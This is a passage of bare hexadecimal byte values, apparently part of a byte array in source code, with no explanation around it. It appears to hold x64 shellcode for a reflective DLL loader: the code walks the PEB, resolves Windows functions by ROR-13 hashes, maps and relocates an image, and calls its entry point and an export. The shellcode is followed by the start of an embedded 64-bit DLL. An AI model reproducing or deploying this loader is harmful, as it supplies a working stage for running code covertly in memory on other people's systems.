0x54, 0x6, 0x0, 0x0, 0x48, 0x8b, 0x4f, 0x30, 0x41, 0xbc, 0x0, 0x30, 0x0, 0x0, 0x45, 0x8b, 0xc4, 0x41, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xd6, 0xff, 0x55, 0xc8, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x12, 0x44, 0x8d, 0x48, 0x4, 0x45, 0x8b, 0xc4, 0x49, 0x8b, 0xd6, 0x33, 0xc9, 0xff, 0x55, 0xc8, 0x48, 0x8b, 0xd8, 0x44, 0x8b, 0xa5, 0xd0, 0x0, 0x0, 0x0, 0x41, 0xbb, 0x1, 0x0, 0x0, 0x0, 0x45, 0x84, 0xe3, 0x74, 0x1d, 0x8b, 0x46, 0x3c, 0x89, 0x43, 0x3c, 0x8b, 0x56, 0x3c, 0xeb, 0xb, 0x8b, 0xca, 0x41, 0x3, 0xd3, 0x8a, 0x4, 0x31, 0x88, 0x4, 0x19, 0x3b, 0x57, 0x54, 0x72, 0xf0, 0xeb, 0x19, 0x41, 0x8b, 0xd7, 0x44, 0x39, 0x7f, 0x54, 0x76, 0x10, 0x8b, 0xca, 0x41, 0x3, 0xd3, 0x8a, 0x4, 0x31, 0x88, 0x4, 0x19, 0x3b, 0x57, 0x54, 0x72, 0xf0, 0x48, 0x63, 0x7b, 0x3c, 0x45, 0x8b, 0xd7, 0x48, 0x3, 0xfb, 0x48, 0x89, 0x7d, 0x30, 0x44, 0xf, 0xb7, 0x47, 0x14, 0x49, 0x83, 0xc0, 0x28, 0x66, 0x44, 0x3b, 0x7f, 0x6, 0x73, 0x3a, 0x4c, 0x3, 0xc7, 0x45, 0x8b, 0xcf, 0x45, 0x39, 0x38, 0x76, 0x1f, 0x41, 0x8b, 0x50, 0x4, 0x41, 0x8b, 0x48, 0xfc, 0x41, 0x8b, 0xc1, 0x45, 0x3, 0xcb, 0x48, 0x3, 0xc8, 0x48, 0x3, 0xd0, 0x8a, 0x4, 0x32, 0x88, 0x4, 0x19, 0x45, 0x3b, 0x8, 0x72, 0xe1, 0xf, 0xb7, 0x47, 0x6, 0x45, 0x3, 0xd3, 0x49, 0x83, 0xc0, 0x28, 0x44, 0x3b, 0xd0, 0x72, 0xc9, 0x4c, 0x8b, 0xf3, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x4c, 0x2b, 0x77, 0x30, 0xf, 0x84, 0xd6, 0x0, 0x0, 0x0, 0x44, 0x39, 0xbf, 0xb4, 0x0, 0x0, 0x0, 0xf, 0x84, 0xc9, 0x0, 0x0, 0x0, 0x44, 0x8b, 0x8f, 0xb0, 0x0, 0x0, 0x0, 0x4c, 0x3, 0xcb, 0x45, 0x39, 0x39, 0xf, 0x84, 0xb6, 0x0, 0x0, 0x0, 0x4d, 0x8d, 0x51, 0x8, 0xe9, 0x91, 0x0, 0x0, 0x0, 0x45, 0xf, 0xb7, 0x1a, 0x41, 0xf, 0xb7, 0xcb, 0x41, 0xf, 0xb7, 0xc3, 0x66, 0xc1, 0xe9, 0xc, 0x66, 0x83, 0xf9, 0xa, 0x75, 0x29, 0x45, 0x8b, 0x1, 0x41, 0x81, 0xe3, 0xff, 0xf, 0x0, 0x0, 0x4b, 0x8d, 0x4, 0x18, 0x48, 0x8b, 0x14, 0x18, 0x4b, 0x8d, 0x4, 0x18, 0x41, 0xbb, 0x1, 0x0, 0x0, 0x0, 0x49, 0x3, 0xd6, 0x48, 0x89, 0x14, 0x18, 0x45, 0x8d, 0x43, 0x1, 0xeb, 0x4f, 0x41, 0xbb, 0x1, 0x0, 0x0, 0x0, 0x66, 0x83, 0xf9, 0x3, 0x75, 0xe, 0x25, 0xff, 0xf, 0x0, 0x0, 0x48, 0x8d, 0xc, 0x3, 0x41, 0x8b, 0xc6, 0xeb, 0x2e, 0x66, 0x41, 0x3b, 0xcb, 0x75, 0x15, 0x25, 0xff, 0xf, 0x0, 0x0, 0x48, 0x8d, 0xc, 0x3, 0x49, 0x8b, 0xc6, 0x48, 0xc1, 0xe8, 0x10, 0xf, 0xb7, 0xc0, 0xeb, 0x13, 0x66, 0x41, 0x3b, 0xc8, 0x75, 0x14, 0x25, 0xff, 0xf, 0x0, 0x0, 0x48, 0x8d, 0xc, 0x3, 0x41, 0xf, 0xb7, 0xc6, 0x41, 0x8b, 0x11, 0x48, 0x1, 0x4, 0xa, 0x4d, 0x3, 0xd0, 0x41, 0x8b, 0x41, 0x4, 0x49, 0x3, 0xc1, 0x4c, 0x3b, 0xd0, 0xf, 0x85, 0x5f, 0xff, 0xff, 0xff, 0x4d, 0x8b, 0xca, 0x45, 0x39, 0x3a, 0xf, 0x85, 0x4a, 0xff, 0xff, 0xff, 0x44, 0x39, 0xbf, 0x94, 0x0, 0x0, 0x0, 0xf, 0x84, 0x82, 0x1, 0x0, 0x0, 0x8b, 0x8f, 0x90, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xef, 0x4c, 0x8d, 0x4, 0x19, 0x49, 0x8d, 0x40, 0xc, 0xeb, 0x7, 0x45, 0x3, 0xeb, 0x48, 0x8d, 0x40, 0x14, 0x44, 0x39, 0x38, 0x75, 0xf4, 0x41, 0x8b, 0xc4, 0x83, 0xe0, 0x4, 0x89, 0x45, 0xc0, 0x8b, 0xc1, 0xf, 0x84, 0x89, 0x0, 0x0, 0x0, 0x45, 0x3b, 0xeb, 0xf, 0x86, 0x80, 0x0, 0x0, 0x0, 0x41, 0xc1, 0xec, 0x10, 0x45, 0x8d, 0x5d, 0xff, 0x45, 0x8b, 0xd7, 0x45, 0x85, 0xdb, 0x74, 0x74, 0x4d, 0x8b, 0xc8, 0x41, 0xbe, 0xff, 0x7f, 0x0, 0x0, 0x41, 0xf, 0x10, 0x1, 0x33, 0xd2, 0x41, 0x8b, 0xcd, 0x41, 0x2b, 0xca, 0x69, 0xf6, 0xfd, 0x43, 0x3, 0x0, 0x41, 0x8b, 0xc6, 0xf7, 0xf1, 0x33, 0xd2, 0x81, 0xc6, 0xc3, 0x9e, 0x26, 0x0, 0x8d, 0x48, 0x1, 0x8b, 0xc6, 0xc1, 0xe8, 0x10, 0x41, 0x23, 0xc6, 0xf7, 0xf1, 0x41, 0x3, 0xc2, 0x41, 0xff, 0xc2, 0x48, 0x8d, 0xc, 0x80, 0x41, 0x8b, 0x54, 0x88, 0x10, 0x41, 0xf, 0x10, 0xc, 0x88, 0x41, 0xf, 0x11, 0x4, 0x88, 0x41, 0x8b, 0x41, 0x10, 0x41, 0x89, 0x44, 0x88, 0x10, 0x41, 0xf, 0x11, 0x9, 0x41, 0x89, 0x51, 0x10, 0x4d, 0x8d, 0x49, 0x14, 0x45, 0x3b, 0xd3, 0x72, 0xa1, 0x8b, 0x87, 0x90, 0x0, 0x0, 0x0, 0xeb, 0x4, 0x44, 0x8b, 0x65, 0xc0, 0x8b, 0xf0, 0x48, 0x3, 0xf3, 0x8b, 0x46, 0xc, 0x85, 0xc0, 0xf, 0x84, 0xb1, 0x0, 0x0, 0x0, 0x8b, 0x7d, 0xc0, 0x8b, 0xc8, 0x48, 0x3, 0xcb, 0xff, 0x55, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4c, 0x8b, 0xd0, 0x44, 0x8b, 0x36, 0x44, 0x8b, 0x7e, 0x10, 0x4c, 0x3, 0xf3, 0x4c, 0x3, 0xfb, 0x49, 0x8b, 0xe, 0x48, 0x85, 0xc9, 0x74, 0x5f, 0x48, 0x85, 0xc9, 0x79, 0x8, 0x45, 0xf, 0xb7, 0x6, 0x33, 0xd2, 0xeb, 0x32, 0x48, 0x8d, 0x53, 0x2, 0x33, 0xc0, 0x48, 0x3, 0xd1, 0x38, 0x2, 0x74, 0xe, 0x48, 0x8b, 0xca, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc0, 0x80, 0x39, 0x0, 0x75, 0xf5, 0x48, 0x89, 0x54, 0x24, 0x30, 0x45, 0x33, 0xc0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x66, 0x89, 0x44, 0x24, 0x28, 0x66, 0x89, 0x44, 0x24, 0x2a, 0x4d, 0x8b, 0xcf, 0x49, 0x8b, 0xca, 0xff, 0x55, 0xd0, 0x49, 0x83, 0xc6, 0x8, 0x49, 0x83, 0xc7, 0x8, 0x49, 0x8b, 0xe, 0x48, 0x85, 0xc9, 0x74, 0x7, 0x4c, 0x8b, 0x54, 0x24, 0x38, 0xeb, 0xa1, 0x45, 0x33, 0xff, 0x85, 0xff, 0x74, 0x10, 0x41, 0x83, 0xfd, 0x1, 0x76, 0xa, 0x41, 0x69, 0xcc, 0xe8, 0x3, 0x0, 0x0, 0xff, 0x55, 0xf0, 0x8b, 0x46, 0x20, 0x48, 0x83, 0xc6, 0x14, 0x85, 0xc0, 0xf, 0x85, 0x56, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x7d, 0x30, 0x4c, 0x8b, 0x6d, 0xd0, 0x44, 0x39, 0xbf, 0xf4, 0x0, 0x0, 0x0, 0xf, 0x84, 0xa9, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xbf, 0xf0, 0x0, 0x0, 0x0, 0x49, 0x83, 0xc7, 0x4, 0x4c, 0x3, 0xfb, 0x45, 0x33, 0xe4, 0x41, 0x8b, 0x7, 0x85, 0xc0, 0xf, 0x84, 0x8a, 0x0, 0x0, 0x0, 0x8b, 0xc8, 0x48, 0x3, 0xcb, 0xff, 0x55, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8b, 0xc8, 0x41, 0x8b, 0x77, 0x8, 0x45, 0x8b, 0x77, 0xc, 0x48, 0x3, 0xf3, 0x4c, 0x3, 0xf3, 0x4c, 0x39, 0x26, 0x74, 0x5e, 0x49, 0x8b, 0x16, 0x48, 0x85, 0xd2, 0x79, 0x8, 0x44, 0xf, 0xb7, 0xc2, 0x33, 0xd2, 0xeb, 0x34, 0x4c, 0x8d, 0x43, 0x2, 0x49, 0x8b, 0xc4, 0x4c, 0x3, 0xc2, 0x45, 0x38, 0x20, 0x74, 0xe, 0x49, 0x8b, 0xd0, 0x48, 0xff, 0xc2, 0x48, 0xff, 0xc0, 0x44, 0x38, 0x22, 0x75, 0xf5, 0x4c, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x45, 0x33, 0xc0, 0x66, 0x89, 0x44, 0x24, 0x28, 0x66, 0x89, 0x44, 0x24, 0x2a, 0x4c, 0x8b, 0xce, 0x41, 0xff, 0xd5, 0x48, 0x83, 0xc6, 0x8, 0x49, 0x83, 0xc6, 0x8, 0x4c, 0x39, 0x26, 0x74, 0x7, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0xeb, 0xa2, 0x49, 0x83, 0xc7, 0x20, 0xe9, 0x6b, 0xff, 0xff, 0xff, 0x45, 0x33, 0xff, 0xf, 0xb7, 0x77, 0x14, 0x45, 0x8b, 0xf7, 0x48, 0x83, 0xc6, 0x28, 0x41, 0xbc, 0x1, 0x0, 0x0, 0x0, 0x66, 0x44, 0x3b, 0x7f, 0x6, 0xf, 0x83, 0xb, 0x1, 0x0, 0x0, 0x48, 0x3, 0xf7, 0x44, 0x39, 0x3e, 0xf, 0x84, 0xeb, 0x0, 0x0, 0x0, 0x8b, 0x46, 0x14, 0x8b, 0xc8, 0x81, 0xe1, 0x0, 0x0, 0x0, 0x20, 0x75, 0x17, 0xf, 0xba, 0xe0, 0x1e, 0x72, 0x11, 0x85, 0xc0, 0x78, 0xd, 0x45, 0x8b, 0xc4, 0x44, 0x89, 0x64, 0x24, 0x20, 0xe9, 0xa4, 0x0, 0x0, 0x0, 0x85, 0xc9, 0x75, 0x3c, 0xf, 0xba, 0xe0, 0x1e, 0x72, 0xa, 0x85, 0xc0, 0x79, 0x6, 0x44, 0x8d, 0x41, 0x8, 0xeb, 0x68, 0x85, 0xc9, 0x75, 0x28, 0xf, 0xba, 0xe0, 0x1e, 0x73, 0xa, 0x85, 0xc0, 0x78, 0x6, 0x44, 0x8d, 0x41, 0x2, 0xeb, 0x54, 0x85, 0xc9, 0x75, 0x14, 0xf, 0xba, 0xe0, 0x1e, 0x73, 0xa, 0x85, 0xc0, 0x79, 0x6, 0x44, 0x8d, 0x41, 0x4, 0xeb, 0x40, 0x85, 0xc9, 0x74, 0x5f, 0xf, 0xba, 0xe0, 0x1e, 0x72, 0xc, 0x85, 0xc0, 0x78, 0x8, 0x41, 0xb8, 0x10, 0x0, 0x0, 0x0, 0xeb, 0x2a, 0x85, 0xc9, 0x74, 0x49, 0xf, 0xba, 0xe0, 0x1e, 0x72, 0xc, 0x85, 0xc0, 0x79, 0x8, 0x41, 0xb8, 0x80, 0x0, 0x0, 0x0, 0xeb, 0x14, 0x85, 0xc9, 0x74, 0x33, 0xf, 0xba, 0xe0, 0x1e, 0x73, 0x11, 0x85, 0xc0, 0x78, 0xd, 0x41, 0xb8, 0x20, 0x0, 0x0, 0x0, 0x44, 0x89, 0x44, 0x24, 0x20, 0xeb, 0x21, 0x85, 0xc9, 0x74, 0x18, 0xf, 0xba, 0xe0, 0x1e, 0x73, 0x12, 0x44, 0x8b, 0x44, 0x24, 0x20, 0x85, 0xc0, 0xb9, 0x40, 0x0, 0x0, 0x0, 0x44, 0xf, 0x48, 0xc1, 0xeb, 0xdd, 0x44, 0x8b, 0x44, 0x24, 0x20, 0xf7, 0x46, 0x14, 0x0, 0x0, 0x0, 0x4, 0x74, 0xa, 0x41, 0xf, 0xba, 0xe8, 0x9, 0x44, 0x89, 0x44, 0x24, 0x20, 0x8b, 0x4e, 0xfc, 0x4c, 0x8d, 0x4c, 0x24, 0x20, 0x8b, 0x16, 0x48, 0x3, 0xcb, 0xff, 0x55, 0x0, 0xf, 0xb7, 0x47, 0x6, 0x45, 0x3, 0xf4, 0x48, 0x83, 0xc6, 0x28, 0x44, 0x3b, 0xf0, 0xf, 0x82, 0xf8, 0xfe, 0xff, 0xff, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x83, 0xc9, 0xff, 0xff, 0x55, 0x8, 0x44, 0x39, 0xbf, 0xd4, 0x0, 0x0, 0x0, 0x74, 0x24, 0x8b, 0x87, 0xd0, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x74, 0x18, 0x18, 0xeb, 0xf, 0x45, 0x33, 0xc0, 0x41, 0x8b, 0xd4, 0x48, 0x8b, 0xcb, 0xff, 0xd0, 0x48, 0x8d, 0x76, 0x8, 0x48, 0x8b, 0x6, 0x48, 0x85, 0xc0, 0x75, 0xe9, 0x4c, 0x8b, 0x4d, 0x18, 0x4d, 0x85, 0xc9, 0x74, 0x2f, 0x8b, 0x87, 0xa4, 0x0, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x25, 0x8b, 0xc8, 0x4c, 0x8b, 0xc3, 0x48, 0xb8, 0xab, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0x48, 0xf7, 0xe1, 0x8b, 0x8f, 0xa0, 0x0, 0x0, 0x0, 0x48, 0xc1, 0xea, 0x3, 0x48, 0x3, 0xcb, 0x41, 0x2b, 0xd4, 0x41, 0xff, 0xd1, 0x8b, 0x47, 0x28, 0x4d, 0x8b, 0xc4, 0x48, 0x3, 0xc3, 0x41, 0x8b, 0xd4, 0x48, 0x8b, 0xcb, 0xff, 0xd0, 0x8b, 0xb5, 0xb8, 0x0, 0x0, 0x0, 0x85, 0xf6, 0xf, 0x84, 0x97, 0x0, 0x0, 0x0, 0x44, 0x39, 0xbf, 0x8c, 0x0, 0x0, 0x0, 0xf, 0x84, 0x8a, 0x0, 0x0, 0x0, 0x8b, 0x8f, 0x88, 0x0, 0x0, 0x0, 0x48, 0x3, 0xcb, 0x44, 0x8b, 0x59, 0x18, 0x45, 0x85, 0xdb, 0x74, 0x78, 0x44, 0x39, 0x79, 0x14, 0x74, 0x72, 0x44, 0x8b, 0x49, 0x20, 0x41, 0x8b, 0xff, 0x8b, 0x51, 0x24, 0x4c, 0x3, 0xcb, 0x48, 0x3, 0xd3, 0x45, 0x85, 0xdb, 0x74, 0x5d, 0x45, 0x8b, 0x1, 0x45, 0x8b, 0xd7, 0x4c, 0x3, 0xc3, 0x74, 0x52, 0xeb, 0xd, 0xf, 0xbe, 0xc0, 0x44, 0x3, 0xd0, 0x41, 0xc1, 0xca, 0xd, 0x4d, 0x3, 0xc4, 0x41, 0x8a, 0x0, 0x84, 0xc0, 0x75, 0xec, 0x41, 0x3b, 0xf2, 0x75, 0x5, 0x48, 0x85, 0xd2, 0x75, 0x12, 0x41, 0x3, 0xfc, 0x49, 0x83, 0xc1, 0x4, 0x48, 0x83, 0xc2, 0x2, 0x41, 0x3b, 0xfb, 0x73, 0x22, 0xeb, 0xc3, 0x8b, 0x41, 0x1c, 0xf, 0xb7, 0xa, 0x48, 0x3, 0xc3, 0x8b, 0x95, 0xc8, 0x0, 0x0, 0x0, 0x44, 0x8b, 0x4, 0x88, 0x48, 0x8b, 0x8d, 0xc0, 0x0, 0x0, 0x0, 0x4c, 0x3, 0xc3, 0x41, 0xff, 0xd0, 0x48, 0x8b, 0xc3, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x9c, 0x24, 0xb0, 0x1, 0x0, 0x0, 0x48, 0x81, 0xc4, 0x70, 0x1, 0x0, 0x0, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x10, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x60, 0x0, 0x0, 0x0, 0x8b, 0xe9, 0x45, 0x33, 0xf6, 0x48, 0x8b, 0x50, 0x18, 0x4c, 0x8b, 0x4a, 0x10, 0x4d, 0x8b, 0x41, 0x30, 0x4d, 0x85, 0xc0, 0xf, 0x84, 0xb3, 0x0, 0x0, 0x0, 0x41, 0xf, 0x10, 0x41, 0x58, 0x49, 0x63, 0x40, 0x3c, 0x41, 0x8b, 0xd6, 0x4d, 0x8b, 0x9, 0xf3, 0xf, 0x7f, 0x4, 0x24, 0x46, 0x8b, 0x9c, 0x0, 0x88, 0x0, 0x0, 0x0, 0x45, 0x85, 0xdb, 0x74, 0xd2, 0x48, 0x8b, 0x4, 0x24, 0x48, 0xc1, 0xe8, 0x10, 0x66, 0x44, 0x3b, 0xf0, 0x73, 0x22, 0x48, 0x8b, 0x4c, 0x24, 0x8, 0x44, 0xf, 0xb7, 0xd0, 0xf, 0xbe, 0x1, 0xc1, 0xca, 0xd, 0x80, 0x39, 0x61, 0x7c, 0x3, 0x83, 0xc2, 0xe0, 0x3, 0xd0, 0x48, 0xff, 0xc1, 0x49, 0x83, 0xea, 0x1, 0x75, 0xe7, 0x4f, 0x8d, 0x14, 0x18, 0x45, 0x8b, 0xde, 0x41, 0x8b, 0x7a, 0x20, 0x49, 0x3, 0xf8, 0x45, 0x39, 0x72, 0x18, 0x76, 0x8e, 0x8b, 0x37, 0x41, 0x8b, 0xde, 0x49, 0x3, 0xf0, 0x48, 0x8d, 0x7f, 0x4, 0xf, 0xbe, 0xe, 0x48, 0xff, 0xc6, 0xc1, 0xcb, 0xd, 0x3, 0xd9, 0x84, 0xc9, 0x75, 0xf1, 0x8d, 0x4, 0x13, 0x3b, 0xc5, 0x74, 0xe, 0x41, 0xff, 0xc3, 0x45, 0x3b, 0x5a, 0x18, 0x72, 0xd5, 0xe9, 0x5e, 0xff, 0xff, 0xff, 0x41, 0x8b, 0x42, 0x24, 0x43, 0x8d, 0xc, 0x1b, 0x49, 0x3, 0xc0, 0xf, 0xb7, 0x14, 0x1, 0x41, 0x8b, 0x4a, 0x1c, 0x49, 0x3, 0xc8, 0x8b, 0x4, 0x91, 0x49, 0x3, 0xc0, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x20, 0x48, 0x8b, 0x6c, 0x24, 0x28, 0x48, 0x8b, 0x74, 0x24, 0x30, 0x48, 0x8b, 0x7c, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x10, 0x41, 0x5e, 0xc3, 0x4d, 0x5a, 0x90, 0x0, 0x3, 0x0, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0xff, 0xff, 0x0, 0x0, 0xb8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x1, 0x0, 0x0, 0xe, 0x1f, 0xba, 0xe, 0x0, 0xb4, 0x9, 0xcd, 0x21, 0xb8, 0x1, 0x4c, 0xcd, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x20, 0x63, 0x61, 0x6e, 0x6e, 0x6f, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6e, 0x20, 0x69, 0x6e, 0x20, 0x44, 0x4f, 0x53, 0x20, 0x6d, 0x6f, 0x64, 0x65, 0x2e, 0xd, 0xd, 0xa, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa3, 0x51, 0x26, 0x75, 0xe7, 0x30, 0x48, 0x26, 0xe7, 0x30, 0x48, 0x26, 0xe7, 0x30, 0x48, 0x26, 0x34, 0x42, 0x4b, 0x27, 0xe2, 0x30, 0x48, 0x26, 0x34, 0x42, 0x4d, 0x27, 0x62, 0x30, 0x48, 0x26, 0x34, 0x42, 0x4c, 0x27, 0xed, 0x30, 0x48, 0x26, 0xb5, 0x45, 0x4d, 0x27, 0xf8, 0x30, 0x48, 0x26, 0xb5, 0x45, 0x4c, 0x27, 0xe9, 0x30, 0x48, 0x26, 0xb5, 0x45, 0x4b, 0x27, 0xee, 0x30, 0x48, 0x26, 0x34, 0x42, 0x49, 0x27, 0xe2, 0x30, 0x48, 0x26, 0xe7, 0x30, 0x49, 0x26, 0x83, 0x30, 0x48, 0x26, 0x2e, 0x45, 0x4d, 0x27, 0xe6, 0x30, 0x48, 0x26, 0x2e, 0x45, 0x48, 0x27, 0xe6, 0x30, 0x48, 0x26, 0x2e, 0x45, 0x4a, 0x27, 0xe6, 0x30, 0x48, 0x26, 0x52, 0x69, 0x63, 0x68, 0xe7, 0x30, 0x48, 0x26, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x45, 0x0, 0x0, 0x64, 0x86, 0x6, 0x0, 0x61, 0xfe, 0xf, 0x67, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x0, 0x22, 0x20, 0xb, 0x2, 0xe, 0x1d, 0x0, 0xda, 0x0, 0x0, 0x0, 0xce, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x15, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x1, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x60, 0x1, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x40, 0x7c, 0x1, 0x0, 0x44, 0x0, 0x0, 0x0, 0x84, 0x7c, 0x1, 0x0, 0x3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x1, 0x0, 0xf0, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x1, 0x0, 0x4c, 0x6, 0x0, 0x0, 0xe0, 0x67, 0x1, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x1, 0x0, 0x38, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x0, 0x0, 0xb0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x0, 0x0, 0x0, 0x60, 0xd9, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0xda, 0x0, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x0, 0x0, 0x60, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x0, 0x0, 0x9c, 0x95, 0x0, 0x0, 0x0, 0xf0, 0x0, 0x0, 0x0, 0x96, 0x0, 0x0, 0x0, 0xde, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x40, 0x2e, 0x64, 0x61, 0x74, 0x61, 0x0, 0x0, 0x0, 0x40, 0x1d, 0x0, 0x0, 0x0, 0x90, 0x1, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x74, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0xc0, 0x2e, 0x70, 0x64, 0x61, 0x74, 0x61, 0x0, 0x0, 0xf0, 0xf, 0x0, 0x0, 0x0, 0xb0, 0x1, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x40, 0x5f, 0x52, 0x44, 0x41, 0x54, 0x41, 0x0, 0x0, 0xf4, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x1, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x90, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x40, 0x2e, 0x72, 0x65, 0x6c, 0x6f, 0x63, 0x0, 0x0, 0x4c, 0x6, 0x0, 0x0, 0x0, 0xd0, 0x1, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x92, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x42, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 